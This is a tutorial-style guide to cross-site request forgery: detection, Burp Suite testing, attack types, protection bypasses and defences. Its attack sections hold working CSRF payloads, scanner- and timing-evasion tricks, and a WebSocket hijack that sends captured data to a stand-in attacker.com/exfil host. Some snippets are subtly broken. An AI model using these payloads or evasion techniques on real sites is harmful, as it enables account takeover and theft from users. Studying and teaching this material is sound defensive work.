## Cross-Site Request Forgery (CSRF)

- **What it is**
  - A web security vulnerability that allows an attacker to induce users to perform unintended actions on applications where they're authenticated
  - Exploits the web application's trust in a user's browser and authenticated session
  - Forces the victim's browser to send forged HTTP requests, including authentication cookies and other automatically included credentials
  - Circumvents the same-origin policy security mechanism
  - Can lead to unauthorized state-changing requests, account compromise, and data manipulation
  - A "confused deputy" attack where the victim's browser is tricked into misusing its authority

- **How can we identify it systematically**
  - **Static application analysis**
    - Review source code for form submissions lacking anti-CSRF tokens
    - Identify state-changing endpoints without proper verification
    - Locate functions that process user input and modify user data
    - Scan for cookie configurations missing SameSite attributes
    - Look for applications that implement custom authentication without CSRF protection

  - **Dynamic application testing**
    - Map the application's forms and state-changing functions
    - Create a test matrix of all authenticated actions
    - Analyze request patterns:
      - Authenticate as User A, perform action, record request
      - Authenticate as User B, replay User A's request with User B's cookies
      - If request succeeds without validation errors, potential CSRF exists
    - Test form submissions by:
      - Removing CSRF tokens entirely
      - Using tokens from different forms/sessions
      - Modifying token values incrementally to detect weak validation
      - Switching HTTP methods (POST to GET and vice versa)
    - Create CSRF proof-of-concept for each suspected endpoint:
      - Craft HTML with matching form fields and values
      - Host on external domain and test with authenticated session
      - Observe if the action completes without additional verification

  - **Observing application behavior**
    - Monitor network traffic for requests lacking unpredictable parameters
    - Analyze forms for hidden fields containing tokens
    - Check if sensitive operations require re-authentication
    - Test if the application relies on HTTP headers that can't be forged cross-domain (Origin, X-Requested-With)
    - Analyze if CORS is properly implemented for API endpoints
    - Test if the application validates the Referer header and how strictly

- **How to use Burp Suite for advanced detection**
  - **Manual testing with Burp**
    - Capture state-changing requests with Proxy
    - Send to Repeater (Ctrl+R) for modification testing
    - Clone requests and modify as follows:
      - Remove CSRF tokens and other unpredictable parameters
      - Change session cookies to a different authenticated user
      - Modify or remove Origin and Referer headers
      - Observe if requests succeed despite modifications
    - Use Comparer (Ctrl+C) to analyze differences between successful/failed responses
    - View Page Source to examine form structure and script behaviors
    - Use "Engagement tools" → "Find references" to locate token usage patterns

  - **Automated testing with Burp**
    - Generate CSRF PoC:
      - Right-click request → "Engagement tools" → "Generate CSRF PoC"
      - Modify template settings for different attack scenarios:
        - Toggle auto-submit option
        - Add delay before submission
        - Adjust encoding options
        - Test with various delivery methods (form, iframe, XHR)
    - Use Burp Scanner:
      - Scan specific requests or entire authenticated sessions
      - Review "Session handling" and "Access control" issues
      - Enable "Audit checks for CSRF" in scan configurations
      - Test with "Reflected parameters" detection enabled
    - Set up macros for chained request testing:
      - Record sequence of actions leading to sensitive function
      - Use session handling rules to maintain authentication
      - Configure intruder to fuzz CSRF protection parameters

  - **Burp extensions for CSRF**
    - CSRF Token Tracker: Monitors token generation patterns
    - Authorize: Tests requests across different user contexts
    - Token Revealer: Highlights token locations in responses
    - Session Timeout Test: Verifies token and session expiration
    - Param Miner: Discovers hidden parameters that might bypass protection

- **Types of CSRF with detailed parameters**
  - **GET-based CSRF**
    - Characteristics:
      - Simplest form using HTTP GET requests
      - URL parameters contain all necessary data
      - Can be executed without user interaction via various HTML elements
      - Most easily detected and mitigated
    - Attack vectors:
      - Image tags: `<img src="https://bank.com/transfer?to=attacker&amount=1000">`
      - Iframe loading: `<iframe src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none"></iframe>`
      - Anchor tag navigation: `<a href="https://bank.com/transfer?to=attacker&amount=1000" target="_blank">Click here to claim prize</a>`
      - CSS resource loading: `<link rel="stylesheet" href="https://bank.com/transfer?to=attacker&amount=1000">`
      - Script source attribute: `<script src="https://bank.com/transfer?to=attacker&amount=1000"></script>`
    - Identification techniques:
      - Change HTTP method from POST to GET in requests
      - Check if parameters can be moved from body to URL
      - Test if query string parameters alone are sufficient
      - Verify if sensitive actions are accessible via GET

  - **POST-based CSRF**
    - Characteristics:
      - Uses HTTP POST requests with form data
      - Requires HTML forms or JavaScript to execute
      - Generally requires some user interaction or auto-submission
      - More common in secure applications that follow proper HTTP method usage
    - Attack vectors:
      - Auto-submitting forms:
        ```html
        <form id="csrf-form" action="https://bank.com/transfer" method="POST" style="display:none">
          <input type="hidden" name="recipient" value="attacker">
          <input type="hidden" name="amount" value="1000">
          <input type="submit" value="Submit">
        </form>
        <script>document.getElementById("csrf-form").submit();</script>
        ```
      - Social engineering submission:
        ```html
        <form action="https://bank.com/transfer" method="POST">
          <h3>Click to claim your prize!</h3>
          <input type="hidden" name="recipient" value="attacker">
          <input type="hidden" name="amount" value="1000">
          <input type="submit" value="Claim Now" style="background-color:green; color:white; padding:10px;">
        </form>
        ```
      - Clickjacking with positioned form:
        ```html
        <style>
          iframe {opacity: 0.1; position: absolute; z-index: 2;}
          .decoy {position: absolute; z-index: 1; top: 300px; left: 100px;}
        </style>
        <iframe src="https://bank.com/transfer" width="800" height="500"></iframe>
        <button class="decoy">Click to continue</button>
        ```
    - Identification techniques:
      - Analyze POST forms for CSRF token fields
      - Test submission without token or with invalid token
      - Create cross-domain form with matching field names
      - Verify if application checks Origin/Referer headers

  - **JSON/XML-based CSRF**
    - Characteristics:
      - Targets API endpoints using structured data formats
      - Leverages content-type variations and browser behavior
      - Harder to exploit due to preflight CORS checks for custom content types
      - Increasingly common in modern, API-driven applications
    - Attack vectors:
      - Form submission with content-type override:
        ```html
        <form action="https://api.bank.com/transfer" method="POST" enctype="text/plain">
          <input name='{"amount":1000,"recipient":"attacker","padding":"' value='"}'>
          <input type="submit" value="Submit">
        </form>
        ```
      - Exploiting lenient content-type handling:
        ```html
        <form action="https://api.bank.com/transfer" method="POST">
          <input type="hidden" name="amount" value="1000">
          <input type="hidden" name="recipient" value="attacker">
          <input type="submit" value="Submit">
        </form>
        <script>
          // Intercept and modify submission
          document.forms[0].onsubmit = function(e) {
            e.preventDefault();
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://api.bank.com/transfer", true);
            xhr.withCredentials = true;
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({amount:1000,recipient:"attacker"}));
          };
        </script>
        ```
      - Flash-based cross-domain requests (legacy systems):
        ```html
        <object type="application/x-shockwave-flash" data="https://attacker.com/csrf.swf" width="1" height="1">
          <param name="allowScriptAccess" value="always">
          <param name="movie" value="https://attacker.com/csrf.swf">
        </object>
        ```
    - Identification techniques:
      - Test if API accepts form submissions instead of JSON
      - Check if Content-Type is strictly validated
      - Verify if JSON endpoints check Origin/Referer headers
      - Test for Array Wrapper and other JSON bypass techniques

  - **Multi-step CSRF**
    - Characteristics:
      - Chains multiple requests to bypass partial protections
      - Exploits workflow design flaws in multi-stage processes
      - Harder to detect through automated scanning
      - Often targets complex business processes
    - Attack vectors:
      - Sequential form submissions:
        ```html
        <iframe id="frame1" src="https://bank.com/transfer-step1" style="display:none"></iframe>
        <script>
          // Listen for first frame to load, then extract data and submit second step
          document.getElementById("frame1").onload = function() {
            // Extract token or state from first response
            var token = this.contentWindow.document.querySelector('input[name="token"]').value;
            // Submit second step with captured token
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://bank.com/transfer-step2", true);
            xhr.withCredentials = true;
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("token=" + token + "&recipient=attacker&amount=1000&confirm=true");
          };
        </script>
        ```
      - Pre-staging attack parameters:
        ```html
        <!-- Step 1: Set up transfer recipient -->
        <img src="https://bank.com/add-recipient?name=attacker&account=12345" style="display:none">
        <!-- Step 2: Execute transfer after delay -->
        <script>
          setTimeout(function() {
            var form = document.createElement("form");
            form.action = "https://bank.com/quick-transfer";
            form.method = "POST";
            form.innerHTML = '<input name="savedRecipient" value="attacker"><input name="amount" value="1000">';
            document.body.appendChild(form);
            form.submit();
          }, 2000);
        </script>
        ```
    - Identification techniques:
      - Map application workflows and identify dependencies
      - Test if later stages validate the completion of earlier stages
      - Check if tokens from one stage can be reused in another
      - Analyze if parameters from previous steps can be modified

- **CSRF execution and delivery techniques**
  - **Basic HTML injection methods**
    - Self-contained IMG tags:
      ```html
      <img src="https://victim.com/account/settings?email=attacker@evil.com" width="0" height="0" border="0">
      ```
    - Invisible iframes for complex exploitation:
      ```html
      <iframe src="https://attacker.com/csrf-frame.html" style="position:absolute;top:-1000px;left:-1000px;width:1px;height:1px;"></iframe>
      ```
    - Form autosubmission techniques:
      ```html
      <body onload="document.forms[0].submit()">
        <form action="https://victim.com/api/settings" method="POST">
          <!-- form fields -->
        </form>
      </body>
      ```
    - XHR/Fetch requests with credentials:
      ```html
      <script>
        fetch('https://victim.com/api/settings', {
          method: 'POST',
          credentials: 'include',
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: 'email=attacker@evil.com'
        });
      </script>
      ```

  - **Social engineering delivery**
    - Disguised interaction buttons:
      ```html
      <style>
        .prize-button {
          background: linear-gradient(to bottom, #ffcc00, #ff9900);
          border-radius: 10px;
          padding: 15px 30px;
          font-size: 20px;
          color: #fff;
          text-shadow: 1px 1px #000;
          cursor: pointer;
        }
      </style>
      <button class="prize-button" onclick="document.getElementById('csrf-form').submit()">Claim Your Prize!</button>
      <form id="csrf-form" action="https://victim.com/api/settings" method="POST" style="display:none">
        <!-- form fields -->
      </form>
      ```
    - Email-based delivery (HTML email clients):
      ```html
      <a href="https://attacker.com/csrf.html">Click here to verify your account</a>
      ```
    - Malicious attachments:
      - HTML files with embedded CSRF payloads
      - PDF documents with JavaScript (for compatible readers)
    - QR code exploitation:
      - Generate QR code linking to CSRF exploit page
      - Present QR code in legitimate-seeming context

  - **Advanced evasion delivery**
    - Dynamically generated and obfuscated payloads:
      ```html
      <script>
        // Generate form dynamically to bypass static scanners
        var f = document.createElement("form");
        f.setAttribute("action", atob("aHR0cHM6Ly92aWN0aW0uY29tL2FwaS9zZXR0aW5ncw==")); // Base64 encoded URL
        f.setAttribute("method", "POST");
        var i = document.createElement("input");
        i.setAttribute("name", "email");
        i.setAttribute("value", "attacker@evil.com");
        f.appendChild(i);
        document.body.appendChild(f);
        setTimeout(function(){f.submit();}, 1000);
      </script>
      ```
    - Polymorphic payload generation:
      - Randomize variable names and structure
      - Split attack across multiple files/resources
      - Use different encoding techniques per delivery
    - Delayed execution:
      ```html
      <script>
        // Delay execution to evade timing-based detection
        window.addEventListener('focus', function() {
          setTimeout(function() {
            // CSRF payload
          }, Math.random() * 10000 + 5000);
        });
      </script>
      ```

- **Advanced exploitation techniques**
  - **Login CSRF**
    - Forces authentication as attacker
    - Enables monitoring of victim's activities
    - Implementation:
      ```html
      <form action="https://victim.com/login" method="POST" id="login-form">
        <input type="hidden" name="username" value="attacker-account">
        <input type="hidden" name="password" value="attacker-password">
      </form>
      <script>document.getElementById("login-form").submit();</script>
      ```
    - Impact:
      - Access to victim's input in attacker-controlled account
      - Credential harvesting if victim enters additional authentication
      - False sense of security while using attacker's context

  - **Cross-Site WebSocket Hijacking**
    - Establishes authenticated WebSocket connections
    - Enables ongoing bidirectional communication
    - Implementation:
      ```html
      <script>
        var ws = new WebSocket('wss://victim.com/api/streaming');
        ws.onopen = function() {
          // Connection established with victim's authentication
        };
        ws.onmessage = function(event) {
          // Intercept and forward real-time data
          fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify({data: event.data})
          });
        };
      </script>
      ```
    - Impact:
      - Real-time data exfiltration
      - Long-term persistent connections
      - Manipulation of bidirectional communications

  - **Clickjacking-enhanced CSRF**
    - Combines UI redressing with CSRF
    - Tricks users into performing required interactions
    - Implementation:
      ```html
      <style>
        iframe {
          opacity: 0.00001;
          position: absolute;
          z-index: 2;
          top: 0;
          left: 0;
        }
        .decoy-button {
          position: absolute;
          z-index: 1;
          width: 200px;
          height: 50px;
          top: 285px;
          left: 150px;
          background-color: #4CAF50;
          color: white;
          font-size: 16px;
          border-radius: 5px;
        }
      </style>
      <iframe src="https://victim.com/settings" width="800" height="600"></iframe>
      <button class="decoy-button">Download Free Report</button>
      ```
    - Impact:
      - Bypasses CSRF protections requiring user interaction
      - Enables multi-step attacks with required clicks
      - Can defeat advanced security measures like custom confirm dialogs

  - **Cross-Origin Resource Sharing (CORS) exploitation**
    - Leverages misconfigured CORS policies
    - Enables direct API access with credentials
    - Implementation:
      ```html
      <script>
        fetch('https://api.victim.com/user/profile', {
          method: 'GET',
          credentials: 'include'
        })
        .then(response => response.json())
        .then(data => {
          // Extract CSRF token or session data
          fetch('https://api.victim.com/user/settings', {
            method: 'PUT',
            credentials: 'include',
            headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
            },
            body: JSON.stringify({email: 'attacker@evil.com'})
          });
        });
      </script>
      ```
    - Impact:
      - Direct access to authenticated API endpoints
      - Ability to read sensitive data and extract tokens
      - Bypassing traditional CSRF protections via authorized script

- **Advanced CSRF protection bypass techniques**
  - **Token analysis and prediction**
    - Statistical analysis of token patterns:
      - Collect multiple tokens in sequence
      - Analyze format, length, character distribution
      - Identify weak pseudo-random number generators
    - Time-based analysis:
      - Generate tokens at precise intervals
      - Look for time-dependent patterns
      - Identify tokens based on timestamps
    - Cryptographic weaknesses:
      - Test for static components within tokens
      - Analyze for hash collisions
      - Check for insecure encodings (Base64, hex)
    - Implementation:
      ```javascript
      // Token harvesting and analysis
      async function analyzeTokens() {
        let tokens = [];
        // Collect 100 tokens
        for(let i = 0; i < 100; i++) {
          let response = await fetch('https://victim.com/form');
          let text = await response.text();
          let match = text.match(/name="csrf_token" value="([^"]+)"/);
          if(match) tokens.push(match[1]);
        }
        
        // Analyze patterns
        let tokenLengths = new Set(tokens.map(t => t.length));
        let charSets = new Set(tokens.map(t => new Set(t.split(''))));
        console.log("Token length consistency:", tokenLengths.size === 1);
        console.log("Character set consistency:", charSets.size === 1);
        
        // Test for incremental patterns
        for(let i = 1; i < tokens.length; i++) {
          // Compare token components for incremental patterns
          // ...analysis code...
        }
      }
      ```

  - **SameSite cookie bypass techniques**
    - Exploiting SameSite=Lax exceptions:
      - Top-level GET navigations are allowed
      - Implementation:
        ```html
        <a href="https://victim.com/account/settings?new_email=attacker@evil.com" target="_blank" id="exploit-link">Click here</a>
        <script>
          // Simulate user interaction if needed
          document.getElementById("exploit-link").click();
        </script>
        ```
    - Subdomain/same-site attacks:
      - Target cookies scoped to parent domain
      - Implementation:
        ```html
        <!-- If victim.com sets cookies for *.victim.com -->
        <iframe src="https://subdomain.victim.com/page-with-csrf-vulnerability"></iframe>
        ```
    - Cookie prefixing bypass:
      - Test for improper implementation of cookie prefixes
      - Look for applications accepting cookies without checking prefixes
    - Browser transition exploits:
      - Chrome's 2-minute Lax+POST window for new cookies
      - Implementation:
        ```html
        <script>
          // Create new window and force new session cookie
          var win = window.open('https://victim.com/logout');
          setTimeout(() => {
            win.location = 'https://victim.com/login?auto=true';
            setTimeout(() => {
              win.location = 'https://victim.com/csrf-vulnerable-form';
              setTimeout(() => {
                // Execute POST-based CSRF during 2-min window
                win.postMessage('submit-form', 'https://victim.com');
              }, 1000);
            }, 1000);
          }, 1000);
        </script>
        ```

  - **Referer header manipulation**
    - Removing Referer entirely:
      ```html
      <meta name="referrer" content="no-referrer">
      <a href="https://victim.com/account?action=delete" target="_blank">Click me</a>
      ```
    - Partial Referer validation exploitation:
      ```html
      <!-- If application only checks for "victim.com" substring -->
      <meta name="referrer" content="unsafe-url">
      <iframe src="https://attacker.com/page?victim.com"></iframe>
      ```
    - Dynamic Referer control:
      ```html
      <script>
        // Create a link with controlled Referer
        var link = document.createElement('a');
        link.href = 'https://victim.com/api/settings?email=attacker@evil.com';
        link.rel = 'noreferrer';
        // Dynamically test different referrer policies
        link.referrerPolicy = 'no-referrer';
        link.target = '_blank';
        document.body.appendChild(link);
        link.click();
      </script>
      ```
    - Protocol switching:
      - HTTP to HTTPS transitions may strip Referer
      - Implementation:
        ```html
        <meta name="referrer" content="origin">
        <iframe src="http://victim-http-endpoint.com/form"></iframe>
        ```

  - **Exploiting improper token validation**
    - Double-submit cookie bypass:
      ```html
      <script>
        // If application uses double-submit cookie pattern
        document.cookie = "csrf_token=attacker_controlled_value; path=/; domain=victim.com";
        setTimeout(function() {
          var form = document.createElement("form");
          form.action = "https://victim.com/api/settings";
          form.method = "POST";
          form.innerHTML = '<input name="csrf_token" value="attacker_controlled_value"><input name="email" value="attacker@evil.com">';
          document.body.appendChild(form);
          form.submit();
        }, 1000);
      </script>
      ```
    - Token scope exploitation:
      - Using token from one form on another endpoint
      - Reusing expired but not invalidated tokens
      - Leveraging tokens across subdomains
    - Implementation:
      ```html
      <script>
        // Harvest token from low-sensitivity page
        fetch('https://victim.com/user/preferences', {credentials: 'include'})
          .then(r => r.text())
          .then(html => {
            // Extract token
            let token = html.match(/name="csrf_token" value="([^"]+)"/)[1];
            // Use on high-sensitivity endpoint
            let form = document.createElement('form');
            form.action = 'https://victim.com/user/email/change';
            form.method = 'POST';
            form.innerHTML = `
              <input type="hidden" name="csrf_token" value="${token}">
              <input type="hidden" name="new_email" value="attacker@evil.com">
            `;
            document.body.appendChild(form);
            form.submit();
          });
      </script>
      ```

- **Advanced detection and testing methodologies**
  - **Automated scanning approach**
    - Custom CSRF scanner development:
      ```python
      def scan_for_csrf(url, session):
          # 1. Authenticate and establish session
          session.get(url + "/login", data={"username": "test", "password": "test"})
          
          # 2. Map application by crawling
          pages = crawl_site(url, session)
          
          # 3. Identify forms and state-changing endpoints
          forms = []
          for page in pages:
              page_forms = extract_forms(page)
              forms.extend(page_forms)
          
          # 4. Test each form for CSRF vulnerability
          vulnerabilities = []
          for form in forms:
              # Test form without CSRF tokens
              modified_form = remove_csrf_tokens(form)
              result = submit_form(modified_form, session)
              
              # If submission successful without token, likely vulnerable
              if is_successful(result):
                  vulnerabilities.append(form)
                  
          return vulnerabilities
      ```
    - Detection heuristics:
      - Form analysis for token patterns
      - Response parsing for security headers
      - Cookie attribute inspection
      - Authentication flow mapping

  - **Manual testing methodology**
    - Comprehensive checklist approach:
      1. Map all state-changing functionality
      2. Categorize by sensitivity and impact
      3. Create authenticated sessions in multiple browsers
      4. Test cross-session request replay
      5. Create CSRF PoC for each vulnerable endpoint
      6. Test token resilience against manipulation
      7. Verify request header validation
      8. Test multiple delivery methods
    - Proof-of-concept validation:
      - Host exploit on external domain
      - Test with real browsers and sessions
      - Verify full attack chain execution
      - Document with screenshots and network logs

  - **Framework-specific testing**
    - Testing modern JavaScript frameworks:
      ```javascript
      // React/Vue/Angular CSRF testing
      
      // 1. Analyze how framework manages CSRF protection
      // - Check for token inclusion in HTTP headers
      // - Look for built-in CSRF mechanisms
      
      // 2. Intercept API communications
      (function() {
        // Override fetch API
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
          console.log('Fetch request:', args);
          return originalFetch.apply(this, args);
        };
        
        // Override XHR
        const originalOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(...args) {
          console.log('XHR request:', args);
          return originalOpen.apply(this, args);
        };
      })();
      
      // 3. Extract CSRF implementation details
      // - State management inspection
      // - Token storage location
      // - Automatic header inclusion
      ```
    - Testing specific frameworks:
      - Django: Check for csrf_token template usage
      - Spring: Analyze _csrf parameter handling
      - Laravel: Test X-CSRF-TOKEN header validation
      - Express.js: Verify csurf middleware implementation

- **Prevention and remediation strategies**
  - **Implementing robust CSRF tokens**
    - Token generation best practices:
      ```python
      import secrets
      
      def generate_csrf_token():
          # Use cryptographically secure random values
          token = secrets.token_hex(32)  # 256 bits of entropy
          
          # Store in server-side session
          session['csrf_token'] = token
          
          # Optionally add contextual binding
          session['csrf_token_created'] = int(time.time())
          
          return token
      ```
    - Server-side validation:
      ```python
      def validate_csrf_token(request, session):
          # Extract token from request
          token = request.form.get('csrf_token')
          
          # Perform constant-time comparison
          valid = secrets.compare_digest(token, session.get('csrf_token', ''))
          
          # Optional: Check token age
          max_age = 3600  # 1 hour
          if valid and (int(time.time()) - session.get('csrf_token_created', 0)) > max_age:
              valid = False
              # Generate new token for next request
              session['csrf_token'] = generate_csrf_token()
              
          return valid
      ```
    - Implementation variations:
      - Per-session tokens: Simplest, one token per user session
      - Per-request tokens: New token for each form/request
      - Synchronized token pattern: Match token in cookie and form
      - HMAC-based tokens: Cryptographically bind to user session
    - Common frameworks examples:
      - Django: `{% csrf_token %}` in templates
      - Spring: `<input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>`
      - Laravel: `@csrf` Blade directive
      - Express.js: csurf middleware with `csrfToken()` function

  - **Implementing SameSite cookies properly**
    - SameSite implementation:
      ```
      Set-Cookie: session=123; SameSite=Strict; Secure; HttpOnly; Path=/
      ```
    - Implementation strategy:
      - Use Strict for high-security applications and admin interfaces
      - Use Lax for general user sessions with acceptable usability
      - Never use None without Secure flag
      - Apply to all authentication and session cookies
    - Multiple cookie defense:
      ```
      Set-Cookie: session=123; SameSite=Lax; Secure; HttpOnly; Path=/
      Set-Cookie: csrf_protection=1; SameSite=Strict; Secure; HttpOnly; Path=/
      ```
    - Cookie attribute combinations:
      - Always combine with Secure flag (HTTPS only)
      - Always use HttpOnly for session cookies
      - Set appropriate Path and Domain attributes
      - Consider using __Host- prefix for critical cookies

  - **Implementing custom request headers**
    - X-Requested-With header check:
      ```javascript
      // Client-side
      const xhr = new XMLHttpRequest();
      xhr.open('POST', '/api/settings');
      xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
      xhr.withCredentials = true;
      xhr.send(formData);
      
      // Server-side (pseudocode)
      if (request.headers['X-Requested-With'] !== 'XMLHttpRequest') {
        return response.status(403).send('CSRF protection triggered');
      }
      ```
    - Custom anti-CSRF header:
      ```javascript
      // Client-side JavaScript adds a custom header
      fetch('/api/settings', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Anti-CSRF': 'app-specific-value'
        },
        credentials: 'include',
        body: JSON.stringify(data)
      });
      
      // Server requires this header on all state-changing requests
      ```
    - Combined with origin validation:
      ```javascript
      // Server-side pseudocode
      function validateRequest(request) {
        // Verify request has required custom header
        if (!request.headers['X-Anti-CSRF']) {
          return false;
        }
        
        // Verify Origin or Referer header
        const origin = request.headers.origin || extractOrigin(request.headers.referer);
        const allowedOrigins = ['https://app.example.com', 'https://example.com'];
        
        return allowedOrigins.includes(origin);
      }
      ```

  - **Multi-layered defense strategy**
    - Implementing defense in depth:
      1. SameSite cookies as first layer (Strict or Lax)
      2. CSRF tokens for all state-changing operations
      3. Custom header verification where applicable
      4. Referer/Origin validation as additional check
      5. User interaction verification for critical actions
    - Critical operations protection:
      ```javascript
      // Server-side pseudocode for critical actions
      function processCriticalAction(request, user) {
        // 1. Verify CSRF token
        if (!validateCsrfToken(request)) {
          return {error: 'Invalid CSRF token'};
        }
        
        // 2. Verify request headers
        if (!validateRequestHeaders(request)) {
          return {error: 'Invalid request origin'};
        }
        
        // 3. Verify re-authentication
        if (!request.session.recentAuth && !request.body.password) {
          return {error: 'Please provide your password to continue'};
        }
        
        if (!request.session.recentAuth && !validatePassword(user, request.body.password)) {
          return {error: 'Incorrect password'};
        }
        
        // Set recent authentication flag
        request.session.recentAuth = true;
        request.session.recentAuthTime = Date.now();
        
        // 4. Process the action
        return performAction(request.body);
      }
      ```
    - Transaction signing for highest-value operations:
      ```javascript
      // Generate unique transaction code
      function generateTransactionCode(user, transaction) {
        const data = `${user.id}:${transaction.amount}:${transaction.recipient}:${Date.now()}`;
        const signature = crypto.createHmac('sha256', SERVER_SECRET).update(data).digest('hex');
        return signature.substring(0, 8).toUpperCase(); // 8-character code
      }
      
      // Send code via out-of-band channel (SMS, email, authenticator app)
      // Verify code on submission
      ```

- **CSRF in modern web application contexts**
  - **Single Page Applications (SPAs)**
    - Token storage considerations:
      ```javascript
      // Secure token storage and usage in SPAs
      
      // Option 1: HttpOnly cookie + Double Submit
      // - Server sets HttpOnly cookie with random value
      // - Server also provides same value for JavaScript to access
      // - JavaScript includes value in requests
      // - Server verifies both values match
      
      // Option 2: In-memory token storage
      class CsrfProtection {
        constructor() {
          this.token = null;
          this.fetchToken();
        }
        
        async fetchToken() {
          const response = await fetch('/api/csrf-token');
          const data = await response.json();
          this.token = data.token;
        }
        
        getRequestHeaders() {
          return {
            'X-CSRF-Token': this.token
          };
        }
      }
      
      // Usage
      const csrf = new CsrfProtection();
      
      // Add to all API requests
      fetch('/api/settings', {
        method: 'POST',
        headers: {
          ...csrf.getRequestHeaders(),
          'Content-Type': 'application/json'
        },
        credentials: 'include',
        body: JSON.stringify(data)
      });
      ```
    - Framework-specific protections:
      - React: Use custom fetch wrapper with CSRF token
      - Angular: HTTP interceptors for automatic token inclusion
      - Vue: Global axios configuration with request interceptors
    - API endpoint protection:
      ```javascript
      // Server-side pseudocode
      function protectApiEndpoint(handler) {
        return function(request, response) {
          // For APIs, check for token in custom header
          const token = request.headers['X-CSRF-Token'];
          if (!token || !validateCsrfToken(token, request.session)) {
            return response.status(403).json({error: 'CSRF validation failed'});
          }
          
          return handler(request, response);
        };
      }
      
      // Usage
      app.post('/api/settings', protectApiEndpoint(handleSettingsUpdate));
      ```

  - **Microservices architecture**
    - Service-to-service authentication:
      ```javascript
      // Using JWT tokens for service authentication
      // Not vulnerable to CSRF due to not using cookies
      async function callInternalService(endpoint, data) {
        const jwt = generateServiceToken();
        
        return fetch(`https://internal-service.example.com${endpoint}`, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${jwt}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        });
      }
      ```
    - Gateway-level protection:
      ```javascript
      // API Gateway CSRF protection
      function applyGatewayProtection(request) {
        // For browser-originated requests
        if (isBrowserRequest(request)) {
          // Apply CSRF protection rules
          if (!validateCsrfProtection(request)) {
            return createErrorResponse(403, 'CSRF protection triggered');
          }
        }
        
        // For service-to-service communication
        if (isServiceRequest(request)) {
          // Apply service authentication validation
          if (!validateServiceAuth(request)) {
            return createErrorResponse(401, 'Invalid service authentication');
          }
        }
        
        // Forward to upstream service
        return forwardRequest(request);
      }
      ```
    - Cross-service considerations:
      - Use non-cookie authentication for service communication
      - Apply CSRF protection only at user-facing boundaries
      - Implement consistent security policies across services

  - **Mobile application integration**
    - Mobile app API protection:
      ```javascript
      // Server-side protection for APIs used by mobile apps
      function validateMobileRequest(request) {
        // Option 1: Custom app signature/certificate validation
        if (!validateAppSignature(request)) {
          return false;
        }
        
        // Option 2: Bearer token authentication instead of cookies
        // Not vulnerable to CSRF
        if (!validateBearerToken(request)) {
          return false;
        }
        
        return true;
      }
      ```
    - WebView security:
      ```java
      // Android WebView CSRF protection
      WebView webView = findViewById(R.id.webview);
      
      // Disable third-party cookies
      CookieManager.getInstance().setAcceptThirdPartyCookies(webView, false);
      
      // Custom cookie handling
      CookieManager.getInstance().setCookie("example.com", "session=123; HttpOnly");
      
      // Intercept requests to add custom headers
      webView.setWebViewClient(new WebViewClient() {
          @Override
          public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
              // Add app-specific authentication headers
              request.getRequestHeaders().put("X-App-Auth", generateAppAuth());
              return false;
          }
      });
      ```

- **Emerging CSRF protection techniques**
  - **Token binding**
    - Cryptographically binding tokens to TLS connections
    - Implementation concept:
      ```javascript
      // Pseudocode for token binding concept
      
      // During session establishment
      function establishSession(request, response) {
        // Generate session and CSRF token
        const sessionId = generateSecureRandom();
        const csrfToken = generateSecureRandom();
        
        // Create token binding
        const tlsKey = request.connection.getTLSPublicKey();
        const tokenBinding = createBinding(csrfToken, tlsKey);
        
        // Store binding with session
        sessions[sessionId] = {
          userId: authenticatedUser.id,
          tokenBinding: tokenBinding
        };
        
        // Set cookies
        response.setCookie('session', sessionId, {secure: true, httpOnly: true});
        response.setCookie('csrf', csrfToken, {secure: true});
      }
      
      // During request validation
      function validateRequest(request) {
        const session = sessions[request.cookies.session];
        const providedToken = request.headers['X-CSRF-Token'] || request.body.csrf_token;
        const tlsKey = request.connection.getTLSPublicKey();
        
        // Verify token and binding
        return verifyBinding(providedToken, tlsKey, session.tokenBinding);
      }
      ```

  - **Cross-Origin Resource Policy (CORP)**
    - Restricting resource access across origins
    - HTTP header implementation:
      ```
      Cross-Origin-Resource-Policy: same-origin
      ```
    - Use cases:
      - Protecting internal resources from cross-origin requests
      - Preventing sensitive data from being embedded cross-origin
      - Additional defense layer beyond SameSite cookies and CSRF tokens

  - **Permission Policy / Feature Policy**
    - Restricting browser features on a per-origin basis
    - Implementation:
      ```
      Permissions-Policy: sync-xhr=(), document-domain=()
      ```
    - CSRF-specific policies:
      - Disable features that could aid in sophisticated CSRF attacks
      - Control access to payment request APIs and other sensitive features
      - Limit document.domain modifications that could bypass same-origin checks

  - **Trusted Types (for DOM-based protection)**
    - Preventing script injection that could lead to CSRF
    - Implementation:
      ```javascript
      // CSP header
      Content-Security-Policy: require-trusted-types-for 'script';
      
      // JavaScript implementation
      if (window.trustedTypes && trustedTypes.createPolicy) {
        const policy = trustedTypes.createPolicy('myEscapePolicy', {
          createHTML: string => string.replace(/\</g, '&lt;')
        });
        
        // Safe DOM manipulation
        element.innerHTML = policy.createHTML(userInput);
      }
      ```
    - Relevance to CSRF:
      - Prevents client-side manipulation that could lead to token theft
      - Protects against XSS that could be used to bypass CSRF protection
      - Enhances overall security posture of application

- **Testing and validation tools**
  - **Professional security tools**
    - Burp Suite Professional:
      - Scanner with CSRF detection
      - CSRF PoC generator
      - Session handling rules for testing
      - Intruder for token analysis
    - OWASP ZAP:
      - Active scanner with CSRF detection
      - Ajax Spider for SPA testing
      - Attack mode with automatic CSRF testing
      - Scripts for custom CSRF validation
    - Specialized CSRF Tools:
      - XSRFProbe: Advanced CSRF audit tool
      - CSRFTester: Dedicated testing framework
      - CSRF Request Builder: Custom request generation

  - **Custom testing scripts**
    - Python CSRF test script:
      ```python
      import requests
      from bs4 import BeautifulSoup
      import re
      
